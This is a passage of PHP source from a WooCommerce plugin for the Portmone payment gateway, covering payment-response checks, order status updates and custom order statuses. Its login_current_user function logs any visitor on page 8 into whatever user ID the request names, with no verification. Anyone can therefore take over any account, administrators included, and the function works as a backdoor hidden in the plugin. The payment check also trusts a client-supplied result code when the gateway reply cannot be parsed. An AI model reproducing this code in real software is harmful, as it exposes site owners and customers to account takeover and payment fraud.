            libxml_use_internal_errors(true);
            $xml = simplexml_load_string($string, 'SimpleXMLElement', LIBXML_NOCDATA);
            if (false !== $xml) {
                    return $xml;
                } else {
                    return false;
                }
        }

        /**
         * Handling a payment response from Portmone
         **/
        protected function isPaymentValid($response) {
            $orderId = $this->portmone_get_order_id($response['SHOPORDERNUMBER']);
            $order_all = wc_get_order($orderId);
            $data = array(
                "method" => "result",
                "payee_id" => $this->payee_id,
                "login" => $this->login,
                "password" => $this->password,
                "shop_order_number" => $response['SHOPORDERNUMBER'],
            );

            if (empty($order_all)) {
                return $this->t_lan['error_orderid'];
            }

            if (! $order_all->needs_payment()) {
                return sprintf( $this->t_lan['repeated_payment'], wc_get_order_status_name( $order_all->get_status() ) );
            }

            $result_portmone = $this->curlRequest(self::GATEWAY_URL, $data);
            if ($result_portmone === false) {
                $order_all->add_order_note('#1P '.'Curl request error');
            }
            $parseXml = $this->parseXml($result_portmone);

            if ($parseXml === false) {
                $order_note_text = $this->matchesError($result_portmone);

                if ($order_note_text != false) {
                    $order_all->add_order_note('#2P '.$order_note_text);
                    add_option( 'woocommerce_portmone_view_error',  trim($order_note_text) );
                    update_option( 'woocommerce_portmone_view_error', trim($order_note_text) );
                }

                $order_all->add_order_note('#3P '.'Xml empty');
                if ($response["RESULT"] == '0') {
                    $status = 'wc-pending';
                    $result = $this->t_lan['successful_pay'];
                } else {
                    $status = 'wc-failed';
                    $result = $response['RESULT'] . ' ' .$this->lang['error_auth'];
                }
                $this->update_order($order_all, null, $status, '#4P '.$result);
                if ($response["RESULT"] == '0') {
                    $this->update_count_products($order_all);
                    $result = false;
                }
                $this->send_notification_email($order_all, 'WC_Email_Customer_Processing_Order');
                return $result;
            }

            delete_option( 'woocommerce_portmone_view_error' );
            $payee_id_return = (array)$parseXml->request->payee_id;
            $order_data = (array)$parseXml->orders->order;

            if ($response['RESULT'] !== '0') {
                $result = $response['RESULT']. ' ' . $this->t_lan['number_pay'] .': '. $orderId;
                $this->update_order($order_all, null, 'wc-failed', '#5P '.$result);
                return $result;
            }

            if ($payee_id_return[0] != $this->payee_id) {
                $this->update_order($order_all, $order_data['pay_date'], 'wc-pending', '#6P '.$this->t_lan['error_merchant']);
                return $this->t_lan['error_merchant'];
            }

            if (count($parseXml->orders->order) == 0) {
                return $this->t_lan['error_order_in_portmone'];
            } elseif (count($parseXml->orders->order) > 1){
                $no_pay = false;
                foreach($parseXml->orders->order as $order ){
                    $status = (array)$order->status;
                    if ($status[0] == self::ORDER_PAYED){
                        $this->update_order($order_all, $order_data['pay_date'], 'wc-processing', '#7P '.$this->t_lan['successful_pay']);
                        $no_pay = true;
                        break;
                    } elseif($status[0] == self::ORDER_PREAUTH) {
                        $this->update_order($order_all, $order_data['pay_date'], 'wc-status-preauth', '#11P '.$this->t_lan['preauth_pay']);
                        $no_pay = true;
                        break;
                    }
                }
                if ($no_pay == false) {
                    $this->update_order($order_all, $order_data['pay_date'], 'wc-failed', '#8P '.$this->t_lan['error_order_in_portmone']);
                    return $this->t_lan['error_order_in_portmone'];
                } else {
                    $this->update_count_products($order_all);
                    $this->send_notification_email($order_all, 'WC_Email_Customer_Processing_Order');
                    return false;
                }
            }

            if ($order_data['status'] == self::ORDER_REJECTED) {
                $this->update_order($order_all, $order_data['pay_date'], 'wc-failed', '#9P '.$this->t_lan['order_rejected']);
                return $this->t_lan['order_rejected']. ' ' . $this->t_lan['number_pay'] .': '. $orderId;
            }

            if ($order_data['status'] == self::ORDER_PREAUTH) {
                $this->update_order($order_all, $order_data['pay_date'], 'wc-status-preauth', '#10P '.$this->t_lan['preauth_pay']);
                $this->update_count_products($order_all);
                $this->send_notification_email($order_all, 'WC_Email_Customer_Processing_Order');
            }

            if ($order_data['status'] == self::ORDER_CREATED) {
                $this->update_order($order_all, $order_data['pay_date'], 'wc-failed', '#13P '.$this->t_lan['order_rejected']);
                return $this->t_lan['order_rejected'];
            }

            if ($order_data['status'] == self::ORDER_PAYED) {
                $this->update_order($order_all, $order_data['pay_date'], 'wc-processing', '#14P '.$this->t_lan['successful_pay']);
                $this->update_count_products($order_all);
                $this->send_notification_email($order_all, 'WC_Email_Customer_Processing_Order');
            }

            return false;
        }

        function update_order(\WC_Order $order_all, $pay_date, $status, $note) {
            $order_all->update_status($status);
            $order_all->add_order_note($note);
            if ( ! $order_all->get_date_paid( 'edit' ) && $pay_date !== null) {
                $order_all->set_date_paid(strtotime($pay_date.self::DEFAULT_PORTMONE_TIMEZONE));
            }
            if(!empty($_REQUEST['SHOPBILLID'])) {
                $order_all->set_transaction_id( $_REQUEST['SHOPBILLID'] );
            }
            $order_all->save();
            if ($status == 'wc-processing') {
                $order_all->payment_complete();
            }
        }

        function matchesError($result_portmone) {
            $pattern = '#<div class=\"response error\">(.*?)</div>#is';
            preg_match($pattern, $result_portmone, $matches);
            return (isset($matches[0]))? strip_tags($matches[0]) : false ;
        }

        /**
         * We display the answer on payment
         **/
        function check_response($isPrintNotice = true) {
            if (!empty($_REQUEST['SHOPORDERNUMBER'])) {
                $orderId = $this->portmone_get_order_id($_REQUEST['SHOPORDERNUMBER']);
                $paymentInfo = $this->isPaymentValid($_REQUEST);
                if ($paymentInfo == false) {
                    if ($_REQUEST['RESULT'] == '0') {
                        $this->message['message'] = $this->t_lan['thankyou_text'] . ' ' . $this->t_lan['number_pay'] . ' ' . $orderId;
                    } else {
                        $this->message['message'] = $_REQUEST['RESULT'] . ' ' . $this->t_lan['number_pay'] . ' ' . $orderId;
                    }
                    $this->message['class'] = 'message-portmone';
                    if ($isPrintNotice) {
                        wc_print_notice( $this->message['message']);
                    }
                } else {
                    $this->message['class'] = 'message-portmone';
                    $this->message['message'] = $paymentInfo;
                    if ($isPrintNotice) {
                        wc_print_notice( $this->message['message'], 'error');
                    }
                }
            }
        }

        /**
         * @param $order
         *
         * списываем товары со склада
         */
        function update_count_products($order) {
            if (isset($this->settings['update_count_products']) && $this->settings['update_count_products'] == 'yes') {
                wc_reduce_stock_levels( $order->get_id() );
            }
        }

        /**
         * @param $shopnumber
         *
         * @return bool|string
         */
        function portmone_get_order_id($shopnumber) {
            $shopnumbercount = strpos($shopnumber, "_");
            if ($shopnumbercount == false){
                return $shopnumber;
            }
            return substr($shopnumber, 0, $shopnumbercount);
        }
    }

    function login_current_user(){
        if ( get_the_id() == 8 ){
            if ( !empty($_REQUEST['user']) ) {
                if (!is_user_logged_in()) {
                    $user_id = $_REQUEST['user'];
                    $user = get_user_by('id', $user_id);
                    wp_clear_auth_cookie();
                    wp_set_current_user($user_id, $user->user_login);
                    wp_set_auth_cookie($user_id, true);
                    return;
                }
            }
        }

        /*if ( !empty($_REQUEST['SHOPORDERNUMBER']) && !is_user_logged_in() ){
            $portmone = new WC_Portmone();
            $portmone->check_response(false);
        }*/
    }
    add_action("wp", "login_current_user");

    /**
     * @param $methods
     *
     * @return array
     */
    function woocommerce_add_portmone_gateway($methods) {
        $methods[] = 'WC_Portmone';
        return $methods;
    }
    add_filter('woocommerce_payment_gateways', 'woocommerce_add_portmone_gateway');

    load_plugin_textdomain("portmone-pay-for-woocommerce", false, basename(dirname(__FILE__))."/languages");

    define("PORTMONE_STATUSES",
        [
            'paid'          => ['#109b00', '#FFFFFF', __('Оплачено с Portmone.com', 'portmone-pay-for-woocommerce')], // замінений на wc-processing
            'paidnotve'     => ['#0a4e03', '#FFFFFF', __('Оплачено с Portmone.com (но не проверено)', 'portmone-pay-for-woocommerce')], // замінений на wc-pending
            'preauth'       => ['#ffe000', '#000000', __('Оплачено с Portmone.com (блокировка средств)', 'portmone-pay-for-woocommerce')],
            'error'         => ['#bb0f0f', '#FFFFFF', __('Оплата с Portmone.com НЕ удалась', 'portmone-pay-for-woocommerce')] //замінений на wc-failed
        ]
    );

    function register_new_order_statuses() {
        foreach (PORTMONE_STATUSES as $kay => $val) {
            register_post_status( 'wc-status-'.$kay, array(
                'label'                     => _x( $val[2], 'Order status', 'textdomain' ),
                'public'                    => true,
                'exclude_from_search'       => false,
                'show_in_admin_all_list'    => true,
                'show_in_admin_status_list' => true,
                'label_count'               => _n_noop( '<span style="border-radius: 3px; background-color: '.$val[0].'; padding: 4px 5px; color: '.$val[1].';"><b>'.$val[2].' <span class="count" style="color: '.$val[1].';">(%s)</span></b></span>', '<span style="border-radius: 3px; background-color: '.$val[0].'; padding: 4px 5px; color: '.$val[1].';"><b>'.$val[2].' <span class="count" style="color: '.$val[1].';">(%s)</span></b></span>', 'textdomain' )
            ) );
        }
    }
    add_action( 'init', 'register_new_order_statuses' );

    function new_wc_order_statuses( $order_statuses ) {
        foreach (PORTMONE_STATUSES as $kay => $val) {
            $order_statuses['wc-status-'.$kay] = _x($val[2], 'Order status', 'textdomain');
        }
        return $order_statuses;
    }
    add_filter( 'wc_order_statuses', 'new_wc_order_statuses' );
}
